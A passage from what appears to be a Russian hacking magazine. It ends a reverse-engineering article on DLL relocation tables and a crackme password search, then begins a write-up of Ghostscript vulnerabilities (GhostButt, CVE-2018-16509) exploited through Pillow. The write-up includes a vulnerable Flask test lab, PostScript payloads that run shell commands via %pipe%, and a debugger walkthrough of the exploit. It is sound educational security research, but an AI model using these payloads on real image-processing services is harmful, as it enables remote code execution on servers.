файле и носящей гордое имя «Таблицы перемещаемых элементов». За ее
формирование отвечает компоновщик.
   Чтобы познакомиться с ней поближе, откомпилируем и изучим сле дующий
пример:


fixupdemo.c:
__declspec(dllexport) void meme(int x)
{
    static int a=0x666;
    a=x;
}

Откомпилируем командой cl fixupdemo.c /LD и тут же дизассемблируем
его:


DUMPBIN /DISASM fixupdemo.dll > fixupdemo‐disasm.txt
DUMPBIN /SECTION:.data /RAWDATA fixupdemo.dll > fixupdemo‐data.txt



   10001000: 55                  push    ebp
   10001001: 8B EC               mov    ebp,esp
   10001003: 8B 45 08            mov    eax,dword ptr [ebp+8]
   10001006: A3 30 60 00 10      mov    dword ptr ds:[10006030h],eax
   1000100B: 5D                  pop    ebp
   1000100C: C3                  ret


   RAW DATA #3


   10006000: 00 00 00 00 00 00 00 00 00 00 00 00 63 28 00 10
  ............c(..
   10006010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  ................
   10006020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  ................
   10006030: 66 06 00 00 E3 11 00 10 FF FF FF FF 00 00 00 00
  f...a...yyyy....


Судя  по  коду,  запись  содержимого EAX  всегда происходит  в  ячей‐
ку 0x10006030. Но не торопись с выводами! Выведем содержимое таблицы
перемещаемых эле ментов:


DUMPBIN /RELOCATIONS fixupdemo.dll > fixupdemo‐relocations.txt



   BASE RELOCATIONS #4


   1000 RVA,      164 SizeOfBlock
   7   HIGHLOW    10006030
   1C  HIGHLOW    10005004
   23  HIGHLOW    10008A50
   32  HIGHLOW    10008A50
   3A  HIGHLOW    10008A51


Таблица перемещаемых элементов‐то не пуста! И первая же ее запись ука‐
зывает на ячейку 0x100001007, полученную алгебра ическим сложением сме‐
щения 0x7 с RVA‐адресом 0x1000 и базовым адресом заг рузки 0x10000000
(получи его с помощью DUMPBIN самостоятель но). Смотрим — ячей‐
ка 0x100001007 при над лежит инструкции MOV [0x10006030],EAX и ука зыва ет
на самый старший байт непосредственного смещения. Вот это самое сме‐
щение и корректирует загрузчик в ходе подключения динами ческой биб‐
лиотеки (разуме ется, если в этом есть необходимость).
  Желаешь проверить? Пожалуйста, создадим две копии одной DLL (нап‐
ример, с помощью команды copy fixupdemo.dll fixupdemo2.dll) и заг‐
рузим их поочередно следующей программой:
   fixupload.c:


#include <windows.h>
main()
{
    void (*demo) (int a);
    HMODULE h;
    if ((h=LoadLibrary("fixupdemo.dll")) &&
        (h=LoadLibrary("fixupdemo2.dll")) &&
        (demo=(void (*)(int a))GetProcAddress(h,"meme")))
        demo(0x777);
}

Сразу же из командной строки откомпилируем:


cl fixupload.c

Поскольку по одному и тому же адресу две различные DLL не заг рузишь
(откуда же системе знать, что это одна и та же DLL!), загрузчи ку приходится
прибегать к ее перемещению. Загрузим откомпилированную программу
в отладчик и установим точ ку оста нова на функцию LoadLibraryA командой bp
KernelBase!LoadLibraryA. К слову, команда bp позволяет установить точку
останова по адре су, определенному фун кцией.
   Установка точки останова на первую коман ду необходима, что бы пропус‐
тить Startup‐код и попасть в тело функции main. Как легко убедиться,
исполнение программы начина ется отнюдь не с main, а со служебного кода,
в котором очень легко утонуть. Но откуда взялась загадочная буква А на конце
имени функции? Ее происхождение тес но связано с введением в Windows
поддержки уникода.
  Применительно к LoadLibrary — теперь имя библиотеки может быть
написано на любом языке. Зву чит заманчиво, но не ухудшает ли это произво‐
дительность? Разумеется, ухуд шает, еще как! В подавляющем большинстве
случаев вполне достаточно старой доб рой кодировки ASCII. Так какой же
смысл бро сать драгоценные такты процессора на ветер?
  Ради про изводительнос ти было решено пос тупиться размером, создав
отдельные варианты функций для работы с уникодом и ASCII‐символами.
Первые получили суффикс W (от Wide — широкий), а вторые — А (от ASCII).
Эта тонкость скры та от прикладных программистов. Какую именно функцию
вызывать — W или А, решает компилятор, но при работе с отладчиком необ‐
ходимо ука зывать точное имя функции — самос тоятельно определить суф‐
фикс он не в состоянии. Камень преткновения в том, что некоторые функции,
например ShowWindows, вообще не име ют суффиксов — ни А, ни W, и их биб‐
лиотечное имя сов пада ет с каноническим. Как же быть?
  Самое простое — заг лянуть в таблицу импорта препарируемого файла
и отыскать там нашу функцию. Например, применительно к нашему слу чаю:



   >DUMPBIN /IMPORTS fixupload.exe > fixupload‐imports.exe
   ...
   175 GetVersionExA
   1C2 LoadLibraryA
   CA GetCommandLineA
   174 GetVersion
   7D ExitProcess
   29E TerminateProcess
   F7 GetCurrentProcess
   ...





      Developer Command Prompt for VS2017 с введенными командами

Из приведен ного выше фраг мента видно, что LoadLibrary все‐таки имеет суф‐
фикс А, а вот функции ExitProcess и TerminateProcess не име ют суффиксов,
поскольку вообще не работа ют со строками.
  Но вернемся к нашим баранам, от которых нам пришлось так далеко отой‐
ти. Итак, мы поставили бряк на LoadLibraryA и продол жили выполнение прог‐
раммы, она моментально снова останавливается на точке останова.





    Содержимое отладчика в момент останова на фун кции LoadLibraryA

Нажимаем сочета ние Shift + F11 для выхода из LoadLibraryA (анализи‐
ровать ее, в самом деле, ни к чему) и оказываемся в легко узнаваемом теле
функции main:



   0040100b ff1504504000   call    dword ptr [fixupload+0x5004 (00405004)]
   00401011 8945f8         mov     dword ptr [ebp‐8], eax ss:002b:0019f‐
  f38=00401055
   00401014 837df800       cmp     dword ptr [ebp‐8], 0
   00401018 7437           je      fixupload+0x1051 (00401051)
   0040101a 6840604000     push    offset fixupload+0x6040 (00406040)
   0040101f ff1504504000   call    dword ptr [fixupload+0x5004 (00405004)]
   ...
   00401046 6877070000     push    777h
   0040104b ff55fc         call    dword ptr [ebp‐4]


Только после возвращения из LoadLibraryA отладчик не подставил в место
вызова фун кции ее символьное имя стро кой выше выделенной:


call dword ptr [fixupload+0x5004 (00405004)]

Запомним ее как вызов LoadLibraryA.
  Обрати внимание на содержимое регистра EAX (для этого служит команда
r <имя регистра>) — функция возвратила в нем адрес загрузки (на моем
компьютере рав ный 0x10000000). Продолжая трассировку (клавиша F10),
дождись выполнения второго вызова LoadLibraryA. Не правда ли, на этот раз
адрес заг рузки изменился? На моем компь юте ре он равен 0x001d0000.
  Приближаемся к вызову функции demo. В отладчике это выглядит так.


push 777h
call dword ptr [ebp‐4]

Вторая инс трук ция ни о чем не говорит, но вот аргумент 0x777 в пер вой инс‐
трукции опре делен но что‐то нам напоминает. См. исходный текст fixu‐
pload.c. Не забудь переставить палец с кла виши F10 на клавишу F8, что бы
войти внутрь функции.



   001d1000 55             push    ebp
   001d1001 8bec           mov     ebp, esp
   001d1003 8b4508         mov     eax, dword ptr [ebp+8]
   001d1006 a330601d00     mov   dword ptr [fixupdemo2!meme+0x5030
  (001d6030)], eax
   001d100b 5d             pop     ebp
   001d100c c3             ret


Вот оно! Системный  загрузчик скорректировал адрес ячей ки согласно
базовому адресу загрузки самой DLL. Это, конечно, хорошо, да вот проб‐
лема — в оригинальной DLL нет ни такой ячейки, ни даже пос ледовательнос‐
ти A3 30 60 1D 00, в чем лег ко убедиться, произведя контекстный поиск.
Допустим, воз намерились бы мы затереть эту команду NOP’ами. Как найти
это место в оригиналь ной DLL?
  Обратим свой взор выше, на команды, заведомо не содержащие переме‐
щаемых элементов:



   001d1000 55             push    ebp
   001d1001 8bec           mov     ebp, esp
   001d1003 8b4508         mov     eax, dword ptr [ebp+8]


Отчего бы не поискать последовательность 55 8B EC 8B 45 08 A3? В дан‐
ном слу чае это сработает, смотри, как хорошо совпадает:



   10001000: 55                 push        ebp
   10001001: 8B EC              mov         ebp,esp
   10001003: 8B 45 08           mov         eax,dword ptr [ebp+8]
   10001006: A3 30 60 00 10     mov         dword ptr ds:[10006030h],eax


Но, если бы переме щаемые эле менты были густо перемешаны с «нормаль‐
ными», ничего бы не выш ло. Опорная последовательность оказалась бы
слишком короткой для поиска и выдала бы множество ложных срабаты ваний.
Более изящно и надежно можно вычислить истинное содержимое переме‐
щаемых эле мен тов, вычтя из них разницу между действительным и рекомен‐
дуемым адре сом загрузки. В данном слу чае:


модифицированный загрузчиком адрес – (базовый адрес загрузки –
рекомендуемый адрес загрузки):
0x1d6030 – (0x001d0000 – 0x10000000) == 0x1d6030 – FFFFFFFFF01D0000
== 0x10006030

Учитывая обратный порядок следования байтов, получаем, что инструк ция


mov dword ptr ds:[10006030h],eax

в машинном коде должна выглядеть так: A3 30 60 00 10. Ищем ее HIEW’ом,
и чудо — она есть!





                   Найденная в HIEW инструкция


ЗАКЛЮЧЕНИЕ
Вот и подошла к кон цу третья статья цикла, в котором мы переосмысливаем
фундаментальный труд Криса Касперски и перекладыва ем его на современ‐
ные рель сы — новые оси, процессоры и компиляторы. Оста вайся на свя зи
и не забывай отписываться в ком ментах о сво их чаяниях. :)


При меча ние к шагу № 2 («Зна комс тво с дизас сем бле ром»)
из пер вой статьи
После очередного обновления визу альной студии я решил испробовать,
как работает штатный дизассемблер, натравив его на passCompare1.exe,
не пре тер певше го перекомпиляции. С удивлением я обнаружил, что, как в
старые добрые времена, в секции кода в качес тве указате лей на инициали‐
зированные  переменные  используют ся  шес тнадцатеричные  смещения.
Впрочем, от этого ситуация не меняется: вместо того чтобы в секции кода
искать эта лонный пароль, прежде надо заглянуть в секцию данных и узнать,
по какому смещению он там находится.


 00402100: 73 73 77 6F 72 64 3A 00 6D 79 47 4F 4F 44 70 61  ssword:.
 myGOODpa


Так как нам надо выровнять смещение, чтобы пароль начинался с начала
строки, прибавим к смещению 8 — число символов, на которые надо смес‐
тить ssword:.. В резуль тате будем искать ито говое смещение 402108 в сек‐
ции кода и найдем ту же самую инструк цию, что и прежде:


 0040107D: B9 08 21 40 00     mov         ecx,402108h


Только вместо строки мы обна руживаем ее адрес в секции данных. А дальше
следуем описанному в первой статье алгоритму.
ВЗЛОМ
  ЗЛАЯ
     КАРТИНКА





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity



 РАЗБИРАЕМ УЯЗВИМОСТЬ В GHOSTSCRIPT,
       ЧТОБЫ ЭКСПЛУАТИРОВАТЬ PILLOW
                    И IMAGEMAGICK





Специалис ты из Google Project Zero нашли несколь ко опас‐
ных уязвимостей в Ghostscript — популярной реали зации
PostScript. Правильно сформированный файл может поз‐
волить исполнять произволь ный код в целевой системе. Уяз‐
вимости подвержена и библиотека  Pillow, которую час то
исполь зуют в проектах на Python, в том числе — на вебе.
Как это экс плу ати ровать? Давай разбирать ся.


Python Imaging Library (PIL) и ее современный форк Pillow предназначены
для работы с изоб ражениями из Python. В общих чертах они напоминают
модуль gd в PHP. Эти библиотеки используются во многих популярных фрей‐
мворках и модулях. Их вызовы можно встретить в самых раз ных примерах
кода. В общем, Pillow нередко встре чает ся в продакшене, если один из ком‐
понентов стека — это язык Python.
  Для операций с файлами PIL и Pillow используют внешние утилиты, такие
как Ghostscript. Ghostscript — это кросс‐платформенный интерпретатор языка
PostScript (PS). Он может обра баты вать файлы PostScript и конверти ровать их
в дру гие графичес кие форматы, выводить содержимое и печатать на прин‐
терах, не имеющих встроенной поддержки PostScript.
  А PostScript, в свою очередь, — это не просто язык разметки, а полноцен‐
ный язык программирования. В нем реализованы свои алгоритмы работы
с текстом и изоб ражениями.
  Официальная документация Adobe на PostScript в данный момент нас‐
читывает око ло 900 страниц текста и примеров. Так что развернуться тут есть
где. Неудивительно, что настолько развесистая штуковина иног да позволяет
проделывать вещи, которые не были предусмотрены разработчиками интер‐
претаторов.
  На этот раз в интерпретаторе Ghostscript и была обнаружена пачка уяз‐
вимостей, которые снова нашел Тавис Орманди (Tavis Ormandy) из Google
Project Zero. Он сообщил о своей находке осенью этого года. Найденные уяз‐
вимости — это, по сути, продолжение прошлогодней ошиб ки в Ghostscript,
что получила наз вание GhostButt.
  Давай выяс ним, какие слабые места были обна ружены и каким образом их
можно проэксплуатировать.


             INFO

                  •CVE‐2017‐8291 — GhostButt Ghostscript.
                  •CVE‐2018‐16509 — новая уязвимость.



СТЕНД
Демонстрировать уяз вимость я, как обычно, буду с помощью Docker и кон‐
тейнера на основе Debian.


$ docker run ‐‐rm ‐p80:80 ‐ti ‐‐name=pilrce ‐‐hostname=pilrce debian
/bin/bash

Если хочешь нем ного подебажить, то запускай контейнер с соответству ющи‐
ми ключами.


$ docker run ‐‐rm ‐p80:80 ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt
seccomp=unconfined ‐‐name=pilrce ‐‐hostname=pilrce debian /bin/bash

Обновляем репозитории и устанавлива ем Python, менеджер пакетов pip
и вспомогательные утилиты.


$ apt update && apt install ‐y nano wget strace python python‐pip
gdb git

Теперь установим последнюю уяз вимую версию Pillow.


$ pip install "Pillow==5.3.0"

Для удобс тва тес тирования нам также понадобится Flask. Это популярный
фреймворк для создания веб‐приложе ний.


$ pip install flask

Теперь с его помощью напишем небольшой скриптик, который будет при‐
нимать поль зовательские картинки и менять их размер. Довольно обычное
поведение для сов ремен ных веб‐сервисов.


app.py
01: from flask import Flask, flash, get_flashed_messages, make_r
esponse,  redirect, render_template_string, request
02: from os import path, unlink
03: from PIL import Image
04:
05: import tempfile
06:
07: app = Flask(__name__)
08:
09: @app.route('/', methods=['GET', 'POST'])
10: def upload_file():
11:     if request.method == 'POST':
12:         file = request.files.get('image', None)
13:
14:         if not file:
15:             flash('No image found')
16:             return redirect(request.url)
17:
18:         filename = file.filename
19:         ext = path.splitext(filename)[1]
20:
21:         if (ext not in ['.jpg', '.jpeg', '.png', '.gif', '.bmp'])
:
22:             flash('Invalid extension')
23:             return redirect(request.url)
24:
25:         tmp = tempfile.mktemp("test")
26:         img_path = "{}.{}".format(tmp, ext)
27:
28:         file.save(img_path)
29:
30:         img = Image.open(img_path)
31:         w, h = img.size
32:         ratio = 256.0 / max(w, h)
33:
34:         resized_img = img.resize((int(w * ratio), int(h * ratio))
)
35:         resized_img.save(img_path)
36:
37:         r = make_response()
38:         r.data = open(img_path, "rb").read()
39:         r.headers['Content‐Disposition'] = 'attachment;
filename=resized_{}'.format(filename)
40:
41:         unlink(img_path)
42:
43:         return r
44:
45:     return render_template_string('''
46:     <!doctype html>
47:     <title>Image Resizer</title>
48:     <h1>Upload an Image to Resize</h1>
49:     {% with messages = get_flashed_messages() %}
50:     {% if messages %}
51:         <ul class=flashes>
52:         {% for message in messages %}
53:         <li>{{ message }}</li>
54:         {% endfor %}
55:         </ul>
56:     {% endif %}
57:     {% endwith %}
58:     <form method=post enctype=multipart/form‐data>
59:       <p><input type=file name=image>
60:          <input type=submit value=Upload>
61:     </form>
62:     ''')
63:
64: if __name__ == '__main__':
65:     app.run(threaded=True, port=80, host="0.0.0.0")

Осталось запус тить этот скрипт и посмотреть на результат его работы в бра‐
узере.


$ python app.py





            Готовый стенд для тес тирования уязвимости в PIL

Если не хочешь возиться со всеми предустановками вручную, то можешь вос‐
пользоваться готовым решением из репозитория Vulhub.
   Также нам нужен собственно сам Ghostscript версии ниже 9.24. Я буду
использовать две версии: 9.21 — для демонстра ции уяз вимости GhostButt
и 9.23 — для тестирования текуще го бага. Взять их можно на официальном
сайте в разделе заг рузок.


$ wget https://github.com/ArtifexSoftware/ghostpdl‐downloads/
releases/download/gs923/ghostscript‐9.23‐linux‐x86_64.tgz
$ wget https://github.com/ArtifexSoftware/ghostpdl‐downloads/
releases/download/gs921/ghostscript‐9.21‐linux‐x86_64.tgz
$ tar xvzf ghostscript‐9.23‐linux‐x86_64.tgz && tar xvzf ghosts
cript‐9.21‐linux‐x86_64.tgz

После распаковки в соответствующих папках ты найдешь бинар ники gs‐921‐
linux‐x86_64 и gs‐923‐linux‐x86_64. Я буду перемещать их в /usr/bin/gs
по мере необ ходимости.
  Еще я пос тавил вспомогательную ути литу для отладчика GDB — pwndbg.


$ git clone https://github.com/pwndbg/pwndbg
$ cd pwndbg
$ ./setup.sh

И скачал исходники Ghostscript, чтобы скомпилировать дебаг‐версии ути литы.


$ cd ~
$ wget https://github.com/ArtifexSoftware/ghostpdl‐downloads/
releases/download/gs921/ghostscript‐9.21.tar.gz
$ wget https://github.com/ArtifexSoftware/ghostpdl‐downloads/
releases/download/gs923/ghostscript‐9.23.tar.gz
$ tar xvf ghostscript‐9.21.tar.gz
$ tar xvf ghostscript‐9.23.tar.gz
$ cd ~/ghostscript‐9.21 && ./configure && make debug
$ cd ~/ghostscript‐9.23 && ./configure && make debug

Готовые дебаг‐бинар ники будут лежать в папке debugbin. Вот теперь стенд
готов.





   Бинарник Ghostscript, скомпилированный с отла дочной информа цией



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ЗЛАЯ КАРТИНКА
           РАЗБИРАЕМ УЯЗВИМОСТЬ В GHOSTSCRIPT,
                 ЧТОБЫ ЭКСПЛУАТИРОВАТЬ PILLOW
                             И IMAGEMAGICK





ОРИГИНАЛЬНЫЙ GHOSTBUTT (CVE-2017-8291) И ПРИЧИНЫ
УЯЗВИМОСТИ PIL
Прежде чем переходить к рассмот рению недавних уязвимос тей, вернемся
на год назад и посмотрим на их прародителя. Проб лемные версии —
9.21 и ниже, поэтому берем 9.21.


$ cp ~/ghostscript‐9.21‐linux‐x86_64/gs‐921‐linux‐x86_64 /usr/bin/gs





                Используем Ghostscript версии 9.21

Первым делом стоит обратить внимание на то, что PIL автоматически опре‐
деляет тип передаваемого файла. По аналогии с ImageMagick биб лиотека
смотрит на заголовок картинки и передает управление нужному учас тку кода.


/src/PIL/Image.py
2618:     prefix = fp.read(16)
...
2642:     im = _open_core(fp, filename, prefix)
...
2644:     if im is None:
2645:         if init():
2646:             im = _open_core(fp, filename, prefix)
...
2623:     def _open_core(fp, filename, prefix):
2624:         for i in ID:
2625:             try:
2626:                 factory, accept = OPEN[i]
2627:                 result = not accept or accept(prefix)
2628:                 if type(result) in [str, bytes]:
2629:                     accept_warnings.append(result)
2630:                 elif result:
2631:                     fp.seek(0)
2632:                     im = factory(fp, filename)
2633:                     _decompression_bomb_check(im.size)
2634:                     return im
2635:             except (SyntaxError, IndexError, TypeError, struct.
error):
2636:                 # Leave disabled by default, spams the logs
with image
2637:                 # opening failures that are entirely expected.
2638:                 # logger.debug("", exc_info=True)
2639:                 continue
2640:         return None

При обра бот ке фай ла отрабатывает фун кция _open_core. Она вызывает
метод _accept из каждого клас са, который отвечает за формат файла.
В качестве аргументов передаются первые 16 байт обрабатываемого файла.


/src/PIL/BmpImagePlugin.py
49: def _accept(prefix):
50:     return prefix[:2] == b"BM"


/src/PIL/GifImagePlugin.py
38: def _accept(prefix):
39:     return prefix[:6] in [b"GIF87a", b"GIF89a"]


/src/PIL/EpsImagePlugin.py
190: def _accept(prefix):
191:     return prefix[:4] == b"%!PS" or \
192:            (len(prefix) >= 4 and i32(prefix) == 0xC6D3D0C5)

Это открывает неп лохой плацдарм для обхода черных и белых списков.
  Нам интересен загрузчик EpsImagePlugin, который работает с файлами
PostScript. Как мы выяс нили выше, для его вызова необходимо, чтобы файл
имел хидер %!PS.
   Теперь сфокуси руем ся на том, как Python общается с Ghostscript.


/src/PIL/EpsImagePlugin.py
328:     def load(self, scale=1):
329:         # Load EPS via Ghostscript
330:         if not self.tile:
331:             return
332:         self.im = Ghostscript(self.tile, self.size, self.fp,
scale)

Функция load соз дает экземпляр клас са Ghostscript для общения с бинар‐
ником gs.


/src/PIL/EpsImagePlugin.py
070: def Ghostscript(tile, size, fp, scale=1):
071:     """Render an image using Ghostscript"""
...
118:     # Build Ghostscript command
119:     command = ["gs",
120:                "‐q", # Quiet mode
121:                "‐g%dx%d" % size, # Set output geometry (pixels)
122:                "‐r%fx%f" % res, # Set input DPI (dots per inch)
123:                "‐dBATCH", # Exit after processing
124:                "‐dNOPAUSE", # Don’t pause between pages
125:                "‐dSAFER", # Safe mode
126:                "‐sDEVICE=ppmraw", # Ppm driver
127:                "‐sOutputFile=%s" % outfile, # Output file
128:                "‐c", "%d %d translate" % (‐bbox[0], ‐bbox[1]),
129:                # Adjust for image origin
130:                "‐f", infile, # Input file
131:                "‐c", "showpage", # Showpage (see: https://bugs.
ghostscript.com/show_bug.cgi?id=698272)
132:                ]
...
139:     # Push data through Ghostscript
140:     try:
141:         with open(os.devnull, 'w+b') as devnull:
142:             startupinfo = None
143:             if sys.platform.startswith('win'):
144:                 startupinfo = subprocess.STARTUPINFO()
145:                 startupinfo.dwFlags |= subprocess.STARTF
_USESHOWWINDOW
146:             subprocess.check_call(command, stdin=devnull, stdout
=devnull,
147:                                   startupinfo=startupinfo)
148:         im = Image.open(outfile)
149:         im.load()

Посмотрим, как выглядит запрос на практике. Сделаем пустую картинку.


test.png
%!PS‐Adobe‐3.0 EPSF‐3.0
%%BoundingBox: ‐0 ‐0 100 100

Используем расширение .png, чтобы увидеть, что файл обрабатывается
в соответствии с содер жимым. И набросаем тестовый скрипт, который воз‐
вращает раз мер документа в пикселях.


test.py
01: from PIL import Image
02: import sys
03:
04: def get_img_size(filepath=""):
05:     ''' Get the image length and width '''
06:     if filepath:
07:         img = Image.open(filepath)
08:         img.load()
09:         return img.size
10:     return (0, 0)
11:
12: print(get_img_size(sys.argv[1]))

Запустим наш скрипт, используя утилиту strace.


$ strace ‐f ‐e trace=execve python test.py test.png





            Результат запуска скрипта через ути литу strace

Видим, что был вызван бинарник gs с некоторым набором определенных
в скрип те параметров. Полностью команда имеет вид


$ /usr/bin/gs ‐q ‐g100x100 ‐r72.000000x72.000000 ‐dBATCH ‐dNOPAUSE
‐dSAFER ‐sDEVICE=ppmraw ‐sOutputFile=/tmp/tmpkwUxze ‐c 0 0 translate
‐f test.png ‐c showpage

Аргумент ‐dSAFER включает своего рода песочницу, которая ограничивает
возможность удаления, переименования и выпол нения произвольного кода
в кон тек сте работы gs. Если бы не этот флаг, то для выполнения RCE дос‐
таточно было бы фай ла PostScript следующего вида:


test1.png
%!PS‐Adobe‐3.0 EPSF‐3.0
%%BoundingBox: ‐0 ‐0 100 100
currentdevice null false mark /OutputFile (%pipe%echo RCE_IS_HERE > /
dev/tty)
.putdeviceparams
1 true .outputpage
0 0 .quit





     Выполнение произвольного кода в Ghostscript без флага SAFER

Но этот флаг используется уже испокон веков, так что нужно как‐то про‐
биваться через него.
  Именно в этом и заключается уязвимость GhostButt: отключение песоч‐
ницы и выпол нение произвольного кода. Скачаем документ‐эксплоит и про‐
верим его работоспособность.


CVE-2017-8291.png
001: %!PS‐Adobe‐3.0 EPSF‐3.0
002: %%BoundingBox: ‐0 ‐0 100 100
003:
004:
005: /size_from  10000      def
006: /size_step    500      def
007: /size_to   65000      def
008: /enlarge    1000      def
009:
010: %/bigarr 65000 array def
...
094: currentdevice null false mark /OutputFile (%pipe%touch /tmp/
aaaaa)
095: .putdeviceparams
096: 1 true .outputpage
097: .rsdparams
098: %{ } loop
099: 0 0 .quit
100: %asdf

Снова воспользуемся помощью утилиты strace.


$ strace ‐f ‐e trace=execve python test.py CVE‐2017‐8291.png





  Успешная эксплуатация RCE‐уязвимос ти GhostButt (CVE‐2017‐8291)
  в Ghostscript 9.21

Эксплоит успешно отра ботал.
  В  Ghostscript все манипуляции совершаются в контексте устройств
вывода, так называ емых девайсов (devices). У каждого такого девайса есть
набор парамет ров и нас троек, одна из которых — флаг LockSafetyParams.
Если он установ лен в true, то вклю чает ся режим песочницы.
   Как ты понял, манипулировать фла гом можно с помощью аргумента
командной стро ки SAFER. По дефол ту он выключен, но в нашем слу чае Python
вызывает бинар ник gs с включенной опцией безопасного выполнения.
Поэтому основная задача  эксплоита — выставить  этот флаг в false
перед тем, как передать управление полезной нагрузке. Для этих целей
используется цепоч ка уяз вимостей и трюков.
   Как ты пом нишь, PostScript — это полноценный язык программирования,
который кон цепту аль но напоминает язык форт.
   PostScript — конкатенативный язык. В таком языке широко используется
неявное  ука зание  аргументов  функций,  новые  фун кции  определяются
как композиция функций, а вместо аппликации применяется конкатенация.
Язык PostScript использует стек для хра нения операнда и передачи аргумен‐
тов функци ям, а переменные osbot, osp и ostop указывают на низ, указатель
и вершину сте ка соот ветс твен но.


/ghostscript-9.21/psi/ostack.h
25: // Define the operand stack pointers for operators.
26: #define iop_stack (i_ctx_p‐>op_stack)
27: #define o_stack (iop_stack.stack)
28:
29: #define osbot (o_stack.bot)
30: #define osp (o_stack.p)
31: #define ostop (o_stack.top)

Этот стек так и называется стеком операн дов (operand stack). Помимо него,
есть еще два вида сте ков — стек сло варей (dictionary stack) и стек исполне‐
ния (execution stack), но в рамках данной статьи нам они неинтересны. :)
  В реализации Ghostscript стек хранится в памяти в виде кучи (heap),
и программис там нужно уделять большое внимание логике тех фун кций,
которые могут им манипулировать.
  Вернемся к эксплоиту и пробежимся по нему в отладчи ке, рассмотрим
основные моменты, чтобы понять, что же там происходит и почему такая пос‐
ледовательность команд ведет к выпол нению произволь ного кода. Будем
использовать бинарник с отла доч ной информацией.


$ cp ~/ghostscript‐9.21/debugbin/gs /usr/bin/gs
$ gdb ‐‐args gs ‐q ‐dBATCH ‐dNOPAUSE ‐dSAFER ‐sDEVICE=ppmraw ‐sOutpu
tFile=/dev/null ‐f CVE‐2017‐8291.png





                 Уязвимость GhostButt в отладчике GDB

Мы зна ем, что экспло ит создает файл в директории /tmp. Делает он это при
помощи следующей команды:


$ /OutputFile (%pipe%touch /tmp/aaaaa)

Поискав в сор цах конструкцию %pipe%, натыка емся на файл, который ее
обрабатывает. Вызывается функция pipe_fopen, где отрабатывает popen.
Этот вызов и выполняет переданную команду.


/ghostscript-9.21/base/gdevpipe.c
17: /* %pipe% IODevice */
...
27: /* The pipe IODevice */
28: static iodev_proc_fopen(pipe_fopen);
29: static iodev_proc_fclose(pipe_fclose);
30: const gx_io_device gs_iodev_pipe = {
31:     "%pipe%", "Special",
32:     {iodev_no_init, iodev_no_open_device,
33:      NULL /*iodev_os_open_file */ , pipe_fopen, pipe_fclose,
34:      iodev_no_delete_file, iodev_no_rename_file, iodev_no_file_s
tatus,
35:      iodev_no_enumerate_files, NULL, NULL,
36:      iodev_no_get_params, iodev_no_put_params
37:     }
38: };
39:
...
43: pipe_fopen(gx_io_device * iodev, const char *fname, const char *
access,
44:            FILE ** pfile, char *rfname, uint rnamelen)
45: {
...
60:     *pfile = popen((char *)fname, (char *)access);

Давай поставим брейк‐пойнт на popen и выполним нашу коман ду.





       Отладка эксплоита GhostButt. Брейк‐пойнт на функции popen

Выполним команду bt, чтобы увидеть, как мы до такого докатились.





                   Бэктрейс во вре мя вызова popen

Видим, что уязвимость срабатывает после фун кции zoutputpage. Оператор .
outputpage в PostScript отправляет стра ницу на указанное устройство. Что же
такого особенного в структуре этой страницы? Обрати внимание на команду
.eqproc. Она принимает на вход два операнда из стека, сравнива ет их,
а резуль тат в виде булева значения записывает в стек.


/ghostscript-9.21/psi/zmisc3.c
053: zeqproc(i_ctx_t *i_ctx_p)
054: {
055:     os_ptr op = osp;
056:     ref2_t stack[MAX_DEPTH + 1];
057:     ref2_t *top = stack;
058:
059:     make_array(&stack[0].proc1, 0, 1, op ‐ 1);
060:     make_array(&stack[0].proc2, 0, 1, op);

Так как типы операндов не проверяются, то мож но сравнить любые операн‐
ды. Исполь зуя .eqproc в цик ле, можно вызвать переполнение указателя сте‐
ка в стеке операн дов, и каждый последующий вызов фун кции будет записы‐
вать в стек примитив.


/ghostscript-9.21/psi/zmisc3.c
112:     make_false(op ‐ 1);
113:     pop(1);
114:     return 0;
115: }





                   Отладка .eqproc в Ghostscript

Сравни, вот та же самая фун кция в Ghostscript версии 9.23.


/ghostscript-9.23/psi/zmisc3.c
62: zeqproc(i_ctx_t *i_ctx_p)
63: {
64:     os_ptr op = osp;
65:     ref2_t stack[MAX_DEPTH + 1];
66:     ref2_t *top = stack;
67:
68:     check_op(2);
69:     if (!eqproc_check_type(op ‐1) || !eqproc_check_type(op)) {
70:         make_false(op ‐ 1);
71:         pop(1);
72:         return 0;
73:     }
74:
75:     make_array(&stack[0].proc1, 0, 1, op ‐ 1);
76:     make_array(&stack[0].proc2, 0, 1, op);
77:     for (;;) {

Добавился блок с проверкой сравниваемых операндов. Как это мож но
использовать? Для манипуляции указателем стека применяется еще один
оператор — aload, так что указатель стека обновляется до адреса сле‐
дующей кучи строкового буфера. Переполняя и записывая примитивы, зло‐
умышленник может вывести относительный адрес следующего указателя сте‐
ка (osp) и затем выпол нить строковую функцию, которая переопределит часть
свойств объекта стека.


<array> aload <obj_0> ... <obj_n‐1> <array>

Когда размер массива превыша ет текущее свободное пространство стека,
zaload выделит память при помощи вызова ref_stack_push, перераспре‐
делит стек и перезапишет указатель стека osp.


/ghostscript-9.21/psi/zarray.c
49: /* <array> aload <obj_0> ... <obj_n‐1> <array> */
50: static int
51: zaload(i_ctx_t *i_ctx_p)
52: {
...
62:     if (asize > ostop ‐ op) {   /* Use the slow, general algori
thm. */
63:         int code = ref_stack_push(&o_stack, asize);
64:         uint i;
65:         const ref_packed *packed = aref.value.packed;
66:
67:         if (code < 0)
68:             return code;
69:         for (i = asize; i > 0; i‐‐, packed = packed_next(packed))
70:             packed_get(imemory, packed, ref_stack_index(&o_stack,
 i));
71:         *osp = aref;
72:         return 0;
73:     }

Для удобс тва дальнейшей отладки расставим функцию вывода строк (print)
так, чтобы она срабатывала во время выполнения всех важных частей экс пло‐
ита, а ловить их будем при помощи бряков на zprint.


CVE-2017-8291.png
44: /buffersearchvars [0 0 0 0 0] def
45: /sdevice [0] def
46:
47: buffers
48: (hey) print
49: pop     % discard buffers on operator stack
50:
51: enlarge array aload
52: (after aload) print
53: {
54:     .eqproc

После того как бряк сработает в первый раз, дно стека (ospbot) будет
находить ся по адресу 0x555556fe4128, а  указатель на  стек  (osp) —
0x555556fe4138. По адресу 0x5555572762eb рас положи лась строка hey,
которую мы собираемся выводить. А пос ледний элемент — адрес строкового
буфера. Он лежит по адре су 0x555557901580, и его размер — 65 000 байт.
